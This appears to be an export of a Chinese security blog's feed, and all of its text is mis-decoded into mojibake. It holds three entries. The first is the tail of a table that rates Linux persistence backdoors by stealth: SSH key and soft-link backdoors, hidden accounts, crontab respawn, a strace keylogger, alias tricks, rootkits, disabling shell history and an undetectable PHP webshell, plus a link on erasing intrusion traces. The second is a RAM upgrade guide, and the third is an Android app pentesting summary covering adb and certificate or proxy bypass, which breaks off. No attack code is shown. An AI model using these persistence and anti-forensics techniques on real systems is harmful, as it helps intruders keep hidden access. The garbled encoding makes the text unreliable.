¸ç‰ˆæœ¬ï¼Œè€Œä¸”éœ€è¦å¾ˆå¤šä¾èµ–ç¯å¢ƒ</td><td>âŒ</td><td>âŒ</td></tr><tr><td>sshè½¯é“¾æ¥</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­</td><td>root</td><td>å®¹æ˜“è¢«å‘ç°</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr><tr><td>sshå…¬ç§å¯†é’¥</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­ â­ â­ â­</td><td>User</td><td>å‘ç°ç¨‹åº¦å¾ˆéš¾ï¼Œå‚è€ƒäº†æŒ–çŸ¿ç—…æ¯’</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr><tr><td>åé—¨å¸å·</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­ â­</td><td>root</td><td>ç”¨å‘½ä»¤æ·»åŠ è´¦æˆ·ï¼Œä¸ä¼šåˆ›å»ºç”¨æˆ·homeç›®å½•[æœ‰ä¸€ä¸ªæ˜¯ç›´æ¥æŒ‡å‘rootç›®å½•]</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr><tr><td>crontabè®¡åˆ’ä»»åŠ¡</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­ â­ â­</td><td>User or root</td><td>éš¾ä»¥å‘ç°ï¼Œé€šè¿‡æ‰§è¡Œè®¡åˆ’ä»»åŠ¡</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr><tr><td>Straceåé—¨</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­</td><td>root</td><td>é”®ç›˜è®°å½•çš„åé—¨</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr><tr><td>Aliasåé—¨</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­ â­ â­</td><td>root</td><td>åˆ«ååé—¨ï¼Œéš¾ä»¥å‘ç°ï¼Œä½†æ˜¯éœ€è¦ç”¨æˆ·å»æ‰§è¡Œå‘½ä»¤</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr><tr><td>Rootkitåé—¨[æ£€æµ‹]</td><td>âŒ</td><td>âŒ</td><td>â­ â­ â­</td><td>root</td><td>éš¾ä»¥å‘ç°ï¼Œä½†æ˜¯å®‰è£…å¤æ‚ï¼Œè€Œä¸”æŒ‡å®šå†…æ ¸ç‰ˆæœ¬</td><td>âŒ</td><td>âŒ</td></tr><tr><td>ç©ºæ ¼ä¸è®°å½•å‘½ä»¤</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­ â­â­â­â­</td><td>root</td><td>æœ‰çš„æœåŠ¡å™¨è®¾ç½®äº†ç©ºæ ¼è®°å½•æ‰§è¡Œå‘½ä»¤ï¼Œæ‰§è¡Œè¿™ä¸ªè„šæœ¬å¿«é€Ÿè®¾ç½®ä¸è®°å½•ç©ºæ ¼å‘½ä»¤</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr><tr><td>sshè½¯é“¾æ¥&amp;crontab</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­ â­ â­</td><td>root</td><td>å¿«é€Ÿç”Ÿæˆè½¯é“¾æ¥ï¼Œå¹¶ä¸”æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œæ¯åˆ†é’Ÿåˆ¤æ–­å½“å‰è½¯é“¾æ¥æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœè¢«killæ‰ï¼Œå°±é‡æ–°æ‰§è¡Œ</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr><tr><td>check.py</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­ â­ â­â­â­</td><td>User</td><td>å¿«é€Ÿæ£€æµ‹ç›®æ ‡æœºå™¨å¯ä»¥ä½¿ç”¨é‚£ä¸ªæƒé™ç»´æŒæ¨¡å—</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr><tr><td>sshkeyå¯†é’¥&amp;crontab</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­ â­ â­â­ â­</td><td>User or root</td><td>å¿«é€Ÿç”Ÿæˆsshå¯†é’¥ï¼Œå¹¶ä¸”æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œæ¯åˆ†é’Ÿåˆ¤æ–­å½“å‰å¯†é’¥å’Œå¤šä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœè¢«killæ‰ï¼Œå°±é‡æ–°æ‰§è¡Œ</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr><tr><td>phpæƒé™ç»´æŒä¸æ­»å…æ€é©¬</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>â­ â­ â­ â­â­ â­</td><td>User or root</td><td>phpwebæƒé™ç»´æŒé©¬</td><td>âœ”ï¸</td><td>âœ”ï¸</td></tr></tbody></table><h1 id="Linuxç—•è¿¹æ¸…ç†"><a href="#Linuxç—•è¿¹æ¸…ç†" class="headerlink" title="Linuxç—•è¿¹æ¸…ç†"></a>Linuxç—•è¿¹æ¸…ç†</h1><p><a href="https://fgtbnc.github.io/2023/06/01/%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/#Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86">å…¥ä¾µç—•è¿¹æ¸…ç† | Khazâ€™s Blog (fgtbnc.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¦‚ä½•æ›´æ¢å†…å­˜æ¡</title>
      <link href="/2023/10/13/%E8%A3%85%E6%9C%BA%E4%B9%8B%E6%8D%A2%E5%86%85%E5%AD%98%E6%9D%A1/"/>
      <url>/2023/10/13/%E8%A3%85%E6%9C%BA%E4%B9%8B%E6%8D%A2%E5%86%85%E5%AD%98%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å¥½å¤šå¹´å‰çš„ç”µè„‘äº†ï¼Œå†…å­˜æœ‰ç‚¹ä¸å¤Ÿï¼Œå†…ç½‘é¶åœºå¼€ä¸èµ·æ¥ğŸ˜­</p></blockquote><h2 id="å¦‚ä½•é€‰æ‹©é€‚åˆç”µè„‘çš„å†…å­˜æ¡"><a href="#å¦‚ä½•é€‰æ‹©é€‚åˆç”µè„‘çš„å†…å­˜æ¡" class="headerlink" title="å¦‚ä½•é€‰æ‹©é€‚åˆç”µè„‘çš„å†…å­˜æ¡"></a>å¦‚ä½•é€‰æ‹©é€‚åˆç”µè„‘çš„å†…å­˜æ¡</h2><p><strong>å·¥å…·</strong></p><ul><li><p><a href="https://www.cpuid.com/softwares/cpu-z.htm">CPU-Z | Softwares | CPUID</a></p></li><li><p><a href="https://www.ghxi.com/aida64e.html">AIDA64 v6.92.6600 ä¾¿æºç‰ˆ - æœæ ¸å‰¥å£³ (ghxi.com)</a></p></li></ul><p><strong>å…³æ³¨ä¿¡æ¯</strong></p><p><img src="/../images/image-20231013172841674.png" alt="image-20231013172841674"></p><p><img src="/../images/image-20231013173124433.png" alt="image-20231013173124433"></p><ul><li><p>æ”¯æŒçš„å†…å­˜æ¡ç±»å‹å’Œæœ€å¤§å†…å­˜å¤§å°</p></li><li><p>å‡ ä¸ªæ’æ§½ï¼ˆæ”¯æŒå‡ æ¡å†…å­˜æ¡ï¼‰</p></li><li><p>å†…å­˜æ¡é¢‘ç‡</p><p>è¿™é‡Œçœ‹åˆ°çš„æ˜¯800MHZï¼Œå®é™…ä¸Šæ˜¯1600MHZï¼Œåœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­å¯ä»¥çœ‹åˆ°</p><p><img src="/../images/image-20231013171158829.png" alt="image-20231013171158829"></p><p><a href="https://zhuanlan.zhihu.com/p/462005732">å†…å­˜é¢‘ç‡åªæœ‰ä¸€åŠï¼Ÿåˆ«æ€¥ ç³»ç»Ÿåªæ˜¯å‘Šè¯‰äº†ä½ äº‹å® - çŸ¥ä¹ (zhihu.com)</a></p></li><li><p>åˆ¶é€ å•†ï¼šç»„åŒé€šé“æœ€å¥½ä¸€è‡´</p></li><li><p>ç”µå‹</p><p>ä½ç”µå‹ï¼š1.35V</p><p>æ ‡å‡†ç”µå‹ï¼š1.5V</p></li></ul><p>ç»¼ä¸Šæˆ‘æœ€å¥½å»äº¬ä¸œä¸Šè´­ä¹°DDR3è§„æ ¼ï¼Œæµ·åŠ›å£«å“ç‰Œï¼Œå†…å­˜æ¡é¢‘ç‡ä¸º1600MHZï¼Œä½ç”µå‹ï¼Œå†…å­˜å¤§å°&lt;&#x3D;24GBï¼ˆ32-8ï¼‰çš„å†…å­˜æ¡</p><h2 id="è£…å†…å­˜æ¡"><a href="#è£…å†…å­˜æ¡" class="headerlink" title="è£…å†…å­˜æ¡"></a>è£…å†…å­˜æ¡</h2><p><img src="/../images/image-20231013173501162.png" alt="image-20231013173501162"></p><p><img src="/../images/image-20231013173651787.png" alt="image-20231013173651787"></p><p>çº¢æ¡†å¤„å³ä¸ºå†…å­˜æ¡</p><p><img src="/../images/image-20231013173919923.png" alt="image-20231013173919923"></p><p>çº¢æ¡†å¤„å‘å¤–æ‹‰ï¼Œå–å‡ºå†…å­˜æ¡ï¼Œç„¶åæ–°å†…å­˜æ¡30Â°æ’å…¥ç®­å¤´æ‰€æŒ‡åï¼Œç”¨ç‚¹åŠ›å‘ä¸‹å‹ï¼Œå¬åˆ°å“’çš„ä¸€å£°å°±OKäº†</p><p>å†…å­˜æˆåŠŸå˜ä¸º16GB</p><p><img src="/../images/image-20231013174123502.png" alt="image-20231013174123502"></p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¡¬ä»¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APPæ¸—é€æ€»ç»“</title>
      <link href="/2023/10/12/APP%E6%B8%97%E9%80%8F/"/>
      <url>/2023/10/12/APP%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="AndroidçŸ¥è¯†"><a href="#AndroidçŸ¥è¯†" class="headerlink" title="AndroidçŸ¥è¯†"></a>AndroidçŸ¥è¯†</h1><h2 id="APKæ–‡ä»¶"><a href="#APKæ–‡ä»¶" class="headerlink" title="APKæ–‡ä»¶"></a>APKæ–‡ä»¶</h2><p>APKï¼ˆAndroid Packageï¼‰æ–‡ä»¶æ˜¯Androidæ“ä½œç³»ç»Ÿä¸Šå®‰è£…åº”ç”¨ç¨‹åºçš„ä¸€ç§æ–‡ä»¶æ ¼å¼ã€‚APKæ–‡ä»¶å®é™…ä¸Šæ˜¯ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰ä»£ç ã€èµ„æºå’Œå…¶ä»–æ–‡ä»¶ã€‚</p><p>APKæ–‡ä»¶é€šå¸¸å…·æœ‰ä»¥ä¸‹ç»“æ„ï¼š</p><ol><li><p><code>AndroidManifest.xml</code>ï¼šè¿™æ˜¯APKæ–‡ä»¶çš„ä¸»è¦é…ç½®æ–‡ä»¶ï¼Œå®ƒåŒ…å«åº”ç”¨ç¨‹åºçš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬åº”ç”¨ç¨‹åºåç§°ã€æƒé™ã€ç»„ä»¶ç­‰ã€‚</p><p><img src="/../images/image-20230926222419741.png" alt="image-20230926222419741"></p></li><li><p><code>classes.dex</code>ï¼šè¿™æ˜¯APKæ–‡ä»¶ä¸­çš„æ ¸å¿ƒä»£ç æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰Javaä»£ç ã€‚</p><blockquote><p>DEXï¼ˆDalvik Executableï¼‰æ–‡ä»¶æ˜¯ä¸€ç§ä¸“é—¨ä¸ºAndroidæ“ä½œç³»ç»Ÿè®¾è®¡çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ã€‚å®ƒæ˜¯å°†Javaå­—èŠ‚ç è½¬æ¢ä¸ºDalvikå­—èŠ‚ç çš„ç»“æœã€‚Dalvikå­—èŠ‚ç æ˜¯ä¸€ç§ç‰¹æ®Šçš„å­—èŠ‚ç ï¼Œç”¨äºåœ¨Androidè®¾å¤‡ä¸Šæ‰§è¡ŒJavaä»£ç ã€‚</p><p>Androidåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰Javaä»£ç éƒ½è¢«ç¼–è¯‘æˆDEXæ–‡ä»¶ï¼Œç„¶åæ‰“åŒ…åˆ°APKæ–‡ä»¶ä¸­ã€‚å½“ç”¨æˆ·å®‰è£…åº”ç”¨ç¨‹åºæ—¶ï¼ŒDEXæ–‡ä»¶ä¼šè¢«è§£å‹å¹¶åŠ è½½åˆ°è®¾å¤‡çš„å†…å­˜ä¸­ï¼Œä»¥ä¾¿åœ¨è®¾å¤‡ä¸Šæ‰§è¡Œåº”ç”¨ç¨‹åºã€‚</p></blockquote></li><li><p><code>resources.arsc</code>: åŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰éä»£ç èµ„æºï¼Œå¦‚å­—ç¬¦ä¸²ã€å›¾åƒã€å¸ƒå±€ã€ä¸»é¢˜ç­‰ç­‰ã€‚è¯¥æ–‡ä»¶æ˜¯åº”ç”¨ç¨‹åºä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œç”¨äºæ”¯æŒåº”ç”¨ç¨‹åºçš„å¤šè¯­è¨€å’Œå¤šç§é…ç½®ã€‚</p><p><img src="/../images/image-20230926222546190.png" alt="image-20230926222546190"></p></li><li><p><code>lib/</code>ï¼šè¿™ä¸ªç›®å½•åŒ…å«äº†åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ‰€æœ‰æœ¬åœ°åº“æ–‡ä»¶ï¼Œé€šå¸¸æŒ‰ç…§ä¸åŒçš„CPUæ¶æ„åˆ†åˆ«å­˜æ”¾ã€‚</p><p><img src="/../images/image-20230926222612453.png" alt="image-20230926222612453"></p></li><li><p><code>res/</code>ï¼šè¿™ä¸ªç›®å½•åŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰èµ„æºæ–‡ä»¶ï¼Œä¾‹å¦‚å¸ƒå±€ã€å­—ç¬¦ä¸²ã€å›¾åƒç­‰ã€‚</p><p><img src="/../images/image-20230926222649268.png" alt="image-20230926222649268"></p></li><li><p><code>assets/</code>ï¼šè¿™ä¸ªç›®å½•åŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰æœªç¼–è¯‘çš„èµ„æºæ–‡ä»¶ï¼Œä¾‹å¦‚å£°éŸ³ã€è§†é¢‘ç­‰ã€‚</p><p><img src="/../images/image-20230926222714428.png" alt="image-20230926222714428"></p></li><li><p><code>META-INF/</code>ï¼šè¿™ä¸ªç›®å½•åŒ…å«äº†APKæ–‡ä»¶çš„æ•°å­—ç­¾åä¿¡æ¯ã€‚</p><p><img src="/../images/image-20230926222742918.png" alt="image-20230926222742918"></p><p><img src="/../images/image-20230926222757403.png" alt="image-20230926222757403"></p></li></ol><h2 id="Android-å››å¤§åº”ç”¨ç¨‹åºç»„ä»¶"><a href="#Android-å››å¤§åº”ç”¨ç¨‹åºç»„ä»¶" class="headerlink" title="Android å››å¤§åº”ç”¨ç¨‹åºç»„ä»¶"></a>Android å››å¤§åº”ç”¨ç¨‹åºç»„ä»¶</h2><p>å®‰å“åº”ç”¨ç¨‹åºç»„ä»¶æŒ‡çš„æ˜¯æ„æˆå®‰å“åº”ç”¨ç¨‹åºçš„åŸºæœ¬å•å…ƒï¼Œä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼š</p><table><thead><tr><th align="center">ç»„ä»¶åç§°</th><th align="center">å…·ä½“ç”¨é€”</th></tr></thead><tbody><tr><td align="center">æ´»åŠ¨ï¼ˆActivityï¼‰</td><td align="center">è´Ÿè´£ç®¡ç†åº”ç”¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢ï¼Œé€šè¿‡æ´»åŠ¨å¯ä»¥ä¸ç”¨æˆ·äº¤äº’å³<strong>å‘ˆç°å¯ä¾›ç”¨æˆ·äº¤äº’çš„ç•Œé¢</strong></td></tr><tr><td align="center">æœåŠ¡ï¼ˆServiceï¼‰</td><td align="center">åœ¨åå°è¿è¡Œçš„ç»„ä»¶ï¼Œä¸å…·æœ‰ç”¨æˆ·ç•Œé¢ï¼Œä¸»è¦ç”¨äº<strong>æ‰§è¡Œé•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡æˆ–å¤„ç†ä¸ç”¨æˆ·ç•Œé¢æ— å…³çš„æ“ä½œ</strong>ã€‚</td></tr><tr><td align="center">å¹¿æ’­æ¥æ”¶å™¨ï¼ˆBroadcast Receiverï¼‰</td><td align="center">ç”¨äºæ¥æ”¶ç³»ç»Ÿå¹¿æ’­å’Œåº”ç”¨ç¨‹åºå¹¿æ’­ã€‚å³<strong>æ³¨å†Œç‰¹å®šäº‹ä»¶ï¼Œå¹¶åœ¨å…¶å‘ç”Ÿæ—¶è¢«æ¿€æ´»</strong>ï¼Œä¾‹å¦‚ç”µæ± ç”µé‡å˜åŒ–ã€å±å¹•å¼€å…³ã€ç½‘ç»œè¿æ¥çŠ¶æ€ç­‰ï¼Œä¹Ÿå¯ä»¥æ¥æ”¶æ¥è‡ªå…¶ä»–åº”ç”¨ç¨‹åºå‘é€çš„å¹¿æ’­ã€‚</td></tr><tr><td align="center">å†…å®¹æä¾›è€…ï¼ˆContent Providerï¼‰</td><td align="center">ç”¨äº<strong>ç®¡ç†åº”ç”¨ç¨‹åºçš„æ•°æ®</strong>ï¼Œå…è®¸å…¶ä»–åº”ç”¨ç¨‹åºè®¿é—®å’Œå…±äº«åº”ç”¨ç¨‹åºçš„æ•°æ®ã€‚å†…å®¹æä¾›è€…å¯ä»¥è®¿é—®æ–‡ä»¶ç³»ç»Ÿã€SQLite æ•°æ®åº“ã€ç½‘ç»œç­‰æ•°æ®æºã€‚</td></tr></tbody></table><h2 id="Androidåº”ç”¨å­˜å‚¨æ•°æ®"><a href="#Androidåº”ç”¨å­˜å‚¨æ•°æ®" class="headerlink" title="Androidåº”ç”¨å­˜å‚¨æ•°æ®"></a>Androidåº”ç”¨å­˜å‚¨æ•°æ®</h2><p>å¯¹ <code>android</code> çš„æ¯ä¸€ä¸ªåº”ç”¨ï¼Œ<code>android</code> ç³»ç»Ÿä¼šåˆ†é…ä¸€ä¸ªç§æœ‰ç›®å½•ï¼Œç”¨äºå­˜å‚¨åº”ç”¨çš„ç§æœ‰æ•°æ®ã€‚æ­¤ç§æœ‰ç›®å½•é€šå¸¸ä½äº<code>/data/data/åº”ç”¨åç§°/</code></p><h1 id="ADBä½¿ç”¨"><a href="#ADBä½¿ç”¨" class="headerlink" title="ADBä½¿ç”¨"></a>ADBä½¿ç”¨</h1><p>Android è°ƒè¯•æ¡¥ (<code>adb</code>) æ˜¯ä¸€ç§åŠŸèƒ½å¤šæ ·çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯è®©æ‚¨ä¸è®¾å¤‡è¿›è¡Œé€šä¿¡ã€‚<code>adb</code> å‘½ä»¤å¯ç”¨äºæ‰§è¡Œå„ç§è®¾å¤‡æ“ä½œï¼Œä¾‹å¦‚å®‰è£…å’Œè°ƒè¯•åº”ç”¨ã€‚<code>adb</code> æä¾›å¯¹ Unix shellï¼ˆå¯ç”¨æ¥åœ¨è®¾å¤‡ä¸Šè¿è¡Œå„ç§å‘½ä»¤ï¼‰çš„è®¿é—®æƒé™ã€‚å®ƒæ˜¯ä¸€ç§å®¢æˆ·ç«¯-æœåŠ¡å™¨ç¨‹åºï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªç»„ä»¶ï¼š</p><ul><li>å®¢æˆ·ç«¯ï¼ˆå¯¹åº”PCï¼‰ï¼šç”¨äºå‘é€å‘½ä»¤ã€‚å®¢æˆ·ç«¯åœ¨å¼€å‘æœºå™¨ä¸Šè¿è¡Œã€‚æ‚¨å¯ä»¥é€šè¿‡å‘å‡º <code>adb</code> å‘½ä»¤ä»å‘½ä»¤è¡Œç»ˆç«¯è°ƒç”¨å®¢æˆ·ç«¯ã€‚</li><li>å®ˆæŠ¤ç¨‹åº (adbd)ï¼šç”¨äºåœ¨è®¾å¤‡ä¸Šè¿è¡Œå‘½ä»¤ã€‚å®ˆæŠ¤ç¨‹åºåœ¨æ¯ä¸ªè®¾å¤‡ä¸Šä½œä¸ºåå°è¿›ç¨‹è¿è¡Œã€‚</li><li>æœåŠ¡ç«¯ï¼šç”¨äºç®¡ç†å®¢æˆ·ç«¯ä¸å®ˆæŠ¤ç¨‹åºä¹‹é—´çš„é€šä¿¡ã€‚æœåŠ¡å™¨åœ¨å¼€å‘æœºå™¨ä¸Šä½œä¸ºåå°è¿›ç¨‹è¿è¡Œã€‚</li></ul><p>Android SDKé»˜è®¤è‡ªå¸¦<code>adb</code>ï¼Œå®ƒä½äºAndroid SDKçš„platform-toolsç›®å½•ä¸­</p><p><strong>å¸¸ç”¨å‘½ä»¤</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb version <span class="comment"># æŸ¥çœ‹adbç‰ˆæœ¬</span></span><br><span class="line">adb devices -l <span class="comment"># åˆ—å‡ºè®¾å¤‡</span></span><br><span class="line">adb tcpip 5555 <span class="comment"># æœåŠ¡ç«¯å¼€å¯5555ç«¯å£</span></span><br><span class="line">adb connect ip:port   <span class="comment"># è¿æ¥è®¾å¤‡</span></span><br><span class="line">adb disconnect ip:port <span class="comment"># å…³é—­è®¾å¤‡è¿æ¥</span></span><br><span class="line">adb -s service <span class="built_in">command</span> <span class="comment"># å¤šä¸ªè®¾å¤‡æ—¶-sæŒ‡å®šè®¾å¤‡</span></span><br><span class="line">adb install path_to_apk -t <span class="comment"># å®‰è£…apk</span></span><br><span class="line">adb push  pc_file Android _path  <span class="comment"># ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">adb pull  Android _file pc_path <span class="comment"># ä¸‹è½½æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘½ä»¤è¡Œæ“ä½œ</span></span><br><span class="line">adb -s service shell   <span class="comment"># è·å¾—æŒ‡å®šè®¾å¤‡çš„shell</span></span><br><span class="line"><span class="comment"># æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">adb -s service shell <span class="built_in">command</span></span><br><span class="line"><span class="comment"># æˆ–è€…è¿›å…¥å</span></span><br><span class="line">shell&gt;<span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘½ä»¤åœ¨/system/binä¸­</span></span><br><span class="line">pm list packages <span class="comment"># æŸ¥çœ‹åº”ç”¨åˆ—è¡¨</span></span><br><span class="line">pm list packages -e -3  <span class="comment"># æŸ¥è¯¢è®¾å¤‡ä¸Šæ‰€æœ‰å·²å¯ç”¨çš„ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºçš„åŒ…ååˆ—è¡¨</span></span><br><span class="line">getprop ro.build.version.release  <span class="comment"># å®‰å“ç³»ç»Ÿç‰ˆæœ¬</span></span><br><span class="line">screencap Android _path <span class="comment"># æˆªå›¾</span></span><br><span class="line">screenrecord /sdcard/demo.mp4 <span class="comment"># å½•å±</span></span><br></pre></td></tr></table></figure><p><strong>é‡åˆ°çš„é—®é¢˜</strong></p><ul><li><p>more than one device and emulator</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨-så‚æ•°æŒ‡å®šè®¾å¤‡</span><br></pre></td></tr></table></figure></li><li><p>adb server version (41) doesnâ€™t match this client (39); killing</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adbå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç‰ˆæœ¬ä¸ä¸€è‡´</span><br></pre></td></tr></table></figure></li><li><p>ç”±äºæ‰¾ä¸åˆ°adbwinapi.dll,æ— æ³•ç»§ç»­æ‰§è¡Œä»£ç ã€‚é‡æ–°å®‰è£…ç¨‹åºå¯èƒ½ä¼šè§£å†³æ­¤é—®é¢˜</p><p>ç¯å¢ƒå˜é‡é—®é¢˜</p><p>è§£ï¼šå°†adb.exeæ–‡ä»¶å¤åˆ¶åˆ°Windows&#x2F;system32ä¸‹;</p><p>â€‹       å°†adbwinapi.dllå¤åˆ¶åˆ°Windows&#x2F;sysWoW64ä¸‹ã€‚</p></li></ul><p><img src="/../images/image-20230725151602776.png?lastModify=1695029992" alt="image-20230725151602776"></p><p>â€‹è§£å†³</p><p><img src="/../images/image-20230725151520659.png?lastModify=1695029992" alt="image-20230725151520659"></p><p><img src="/../images/image-20230725151508246.png?lastModify=1695029992" alt="image-20230725151508246"></p><p>â€‹æ›´æ”¹åå­—ï¼Œæ›¿æ¢æ¨¡æ‹Ÿå™¨ä¸­çš„adbå³å¯,æˆåŠŸæˆªå›¾</p><p><img src="/../images/image-20230725151826056.png?lastModify=1695029992" alt="image-20230725151826056"></p><h1 id="AndroidæŠ“åŒ…"><a href="#AndroidæŠ“åŒ…" class="headerlink" title="AndroidæŠ“åŒ…"></a>AndroidæŠ“åŒ…</h1><h2 id="HTTPSå•å‘è®¤è¯å’ŒHTTPSåŒå‘è®¤è¯"><a href="#HTTPSå•å‘è®¤è¯å’ŒHTTPSåŒå‘è®¤è¯" class="headerlink" title="HTTPSå•å‘è®¤è¯å’ŒHTTPSåŒå‘è®¤è¯"></a>HTTPSå•å‘è®¤è¯å’ŒHTTPSåŒå‘è®¤è¯</h2><p><a href="https://fgtbnc.github.io/2023/05/30/%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/#HTTPS%E5%8D%95%E5%90%91%E8%AE%A4%E8%AF%81">å¸¸è§åè¯ä¸æ¦‚å¿µ | Khazâ€™s Blog (fgtbnc.github.io)</a></p><h2 id="æŠ“åŒ…æ–¹å¼"><a href="#æŠ“åŒ…æ–¹å¼" class="headerlink" title="æŠ“åŒ…æ–¹å¼"></a>æŠ“åŒ…æ–¹å¼</h2><blockquote><p>å› ä¸ºæ‰‹æœºæ˜¯åä¸ºæ¯”è¾ƒéš¾ærootï¼Œè¿™é‡Œé€‰æ‹©çš„æ˜¯å¤œç¥æ¨¡æ‹Ÿå™¨+burp+postern</p></blockquote><h3 id="sslè¯ä¹¦æ ¡éªŒâ€“HTTPå•å‘è®¤è¯"><a href="#sslè¯ä¹¦æ ¡éªŒâ€“HTTPå•å‘è®¤è¯" class="headerlink" title="sslè¯ä¹¦æ ¡éªŒâ€“HTTPå•å‘è®¤è¯"></a>sslè¯ä¹¦æ ¡éªŒâ€“HTTPå•å‘è®¤è¯</h3><ul><li><p>å®‰å“7.0ä»¥ä¸‹</p><p>ç›´æ¥å®‰è£…burp.cerè¯ä¹¦ï¼Œé…ç½®wifiä»£ç†å³å¯æŠ“åŒ…</p></li><li><p>å®‰å“7.0åŠä»¥ä¸Š</p><blockquote><p>Android ä» 7.0 å¼€å§‹ï¼Œç³»ç»Ÿä¸å†ä¿¡ä»»ç”¨æˆ· CA è¯ä¹¦ï¼ˆåº”ç”¨ targetSdkVersion &gt;&#x3D; 24 æ—¶ç”Ÿæ•ˆï¼Œå¦‚æœ targetSdkVersion &lt;24 å³ä½¿ç³»ç»Ÿæ˜¯ 7.0 + ä¾ç„¶ä¼šä¿¡ä»»ï¼‰ã€‚</p></blockquote><p>ä½¿ç”¨adbå®‰è£…burpè¯ä¹¦çš„pemæ ¼å¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰‹æœºè¯ä¹¦ä½ç½®</span></span><br><span class="line">/system/etc/security/cacerts/</span><br></pre></td></tr></table></figure></li></ul><h3 id="ä»£ç†å±è”½ç»•è¿‡"><a href="#ä»£ç†å±è”½ç»•è¿‡" class="headerlink" title="ä»£ç†å±è”½ç»•è¿‡"></a>ä»£ç†å±è”½ç»•è¿‡</h3><blockquote><p>æœ‰çš„appåšå®Œsslè¯ä¹¦æ ¡éªŒåï¼Œä¸ºäº†é˜²æ­¢è¢«æŠ“åŒ…ï¼Œå¤šåšäº†ä¸€å±‚å¤„ç†ï¼Œç»™appè®¾ç½®è‡ªå·±çš„ä»£ç†åœ°å€ï¼Œå¯èƒ½è¿™ä¸ªä»£ç†åœ°å€å°±æ˜¯æœåŠ¡å™¨çš„åœ°å€ï¼Œè¿™æ ·å°±ä¸èµ°æˆ‘ä»¬è®¾ç½®çš„wifiä»£ç†ï¼Œè‡ªç„¶burpä¹ŸæŠ“ä¸åˆ°åŒ…äº†ã€‚</p></blockquote><p>ä½¿ç”¨posternè®¾ç½®VPNä»£ç†ç»•è¿‡</p><ul><li>é…ç½®ä»£ç†</li></ul><p><img src="/../images/image-20230904134750565.png?lastModify=1695029992" alt="image-20230904134750565"></p><p><img src="/../images/image-20230904134724524.png?lastModify=1695029992" alt="image-20230904134724524"></p><ul><li><p>é…ç½®è§„åˆ™</p><p><img src="/../images/image-20230904134947248.png?lastModify=1695029992" alt="image-20230904134947248"></p></li><li><p>éœ€è¦<strong>å…³é—­wifiä»£ç†</strong>ï¼Œä½¿ç”¨Posternçš„Vpnä»£ç†</p><p><img src="/../images/image-20230904135053270.png?lastModify=1695029992" alt="image-20230904135053270"></p></li></ul><h3 id="SSL-Pinningç»•è¿‡â€“æœ‰é—®é¢˜"><a href="#SSL-Pinningç»•è¿‡â€“æœ‰é—®é¢˜" class="headerlink" 